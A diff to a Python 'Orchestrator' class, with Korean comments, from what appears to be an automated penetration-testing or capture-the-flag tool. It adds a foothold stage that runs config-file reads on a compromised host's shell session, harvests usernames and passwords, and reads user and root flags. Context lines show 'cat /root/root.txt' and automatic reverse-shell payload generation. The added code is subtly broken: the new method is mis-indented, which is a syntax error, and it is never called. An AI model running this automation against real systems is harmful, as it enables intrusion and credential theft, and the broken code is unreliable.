@@ -459,28 +459,7 @@ class Orchestrator:
         if self.exploit_exec and not interrupted:
             self._exploit_run_stage(report, host)     # 3단계: PoC 실행 → 자격
             self._exploit_exec_stage(report, host)    # 1단계: 자격 → 발판 → 플래그
-# orchestrator._exploit_exec_stage 안 (또는 새 _foothold_stage 로 분리) — 사용자 커밋
-from .shell_session import ReverseShellSession, WebRceSession
-from .shell_transport import catch_reverse_shell, web_http_fn   # 1·2 (사용자)
-from . import cred_sources, flag_read
-from .world import ...  # 기존
 
-# (a) 발판 확보: PoC가 역쉘이면 리버스셸, 웹RCE면 WebRceSession
-session = ...  # 상황에 맞게 attach 된 ShellSession
-if session is None or not session.alive:
-    return
-
-# (b) 자격 수확: 설정 cat → 파싱 → world 반영
-for cmd in cred_sources.config_reads(self.world.web_product):
-    out = session.run(cmd)                              # ← 발판에서 실행(표면)
-    for u, p, label in cred_sources.parse_config_creds(out):
-        self.world.add_cred(f"{u}:{p}", source=f"설정({label})")
-
-# (c) 측면이동 후보 발사(선택) + (d) 플래그 수집은 현재 세션으로
-flags = flag_read.read_flags(session, flag_kind=self.flag_kind)
-for kind, val in flags.items():                        # user / root
-    self.world.add_flag(kind, val)
-    # report.user_flag/root_flag 는 world 반영으로 자동 노출
         # ── PHASE 3.9: 리버스쉘 자동 준비 (공격자 IP 확보 시) ──
         self._prepare_revshells(report)
 
@@ -1435,6 +1414,27 @@ for kind, val in flags.items():                        # user / root
                     self._attempt(report, report.enum_findings,
                                   sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
                     break
+        def _foothold_stage(self, report, host) -> None:
+        """발판 세션 확보 → 자격수확 → 플래그 수집. --exploit-exec 전용(RCE 실행 표면)."""
+        if not self.exploit_exec or self.world is None or self.dry_run:
+            return
+        session = self._acquire_session(report, host)   # ← 발판 획득(아래 TODO)
+        if session is None or not session.alive:
+            return
+        from . import cred_sources, flag_read
+        # 자격 수확
+        for cmd in cred_sources.config_reads(self.world.web_product):
+            out = session.run(cmd)
+            for u, p, _label in cred_sources.parse_config_creds(out):
+                self.world.add_cred(f"{u}:{p}", source="설정파일")
+        # 플래그 수집(채널 무관)
+        for kind, val in flag_read.read_flags(session, flag_kind=self.flag_kind).items():
+            self.world.add_flag(kind, val)
+
+    def _acquire_session(self, report, host):
+        """발판 세션 획득. PoC 종류에 따라 리버스셸/웹RCE 세션을 attach 해서 반환.
+        아직 발판이 없으면 None. (여기가 실제 발판 오케스트레이션 — 단계적으로 구현)"""
+        return None   # TODO: catch_reverse_shell(...) 또는 WebRceSession(...).attach(web_http_fn)              
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
         """공격자 IP(VPN tun0 등)가 확보되면 리버스쉘 페이로드를 자동 생성해
         리포트에 담는다. 생성 전용 — 실행은 하지 않는다(안전 경계 유지).
